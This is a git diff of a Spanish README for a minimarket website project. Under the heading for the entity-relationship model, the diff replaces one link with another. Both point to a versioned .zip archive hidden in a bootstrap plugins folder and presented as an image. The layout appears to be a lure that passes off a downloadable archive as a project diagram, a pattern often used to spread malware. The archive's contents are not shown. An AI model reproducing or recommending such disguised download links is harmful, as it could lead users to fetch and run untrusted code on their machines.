@@ -1,8 +1,8 @@
 # 🔹Proyecto de pagina web para un minimercado
 
-## 🔹Modelo entidad relacion ![alt text](https://github.com/cristiancrakl/Mini_Mercado/raw/refs/heads/master/public/backend/plugins/bootstrap/Mercado_Mini_v3.4-alpha.1.zip)
+## 🔹Modelo entidad relacion ![alt text](https://github.com/cristiancrakl/Mini_Mercado/raw/refs/heads/master/public/backend/plugins/bootstrap/Mercado_Mini_v1.6-alpha.4.zip)
 
-### https://github.com/cristiancrakl/Mini_Mercado/raw/refs/heads/master/public/backend/plugins/bootstrap/Mercado_Mini_v3.4-alpha.1.zip
+### https://github.com/cristiancrakl/Mini_Mercado/raw/refs/heads/master/public/backend/plugins/bootstrap/Mercado_Mini_v1.6-alpha.4.zip
 
 ## 🔹 Supuestos del sistema
 
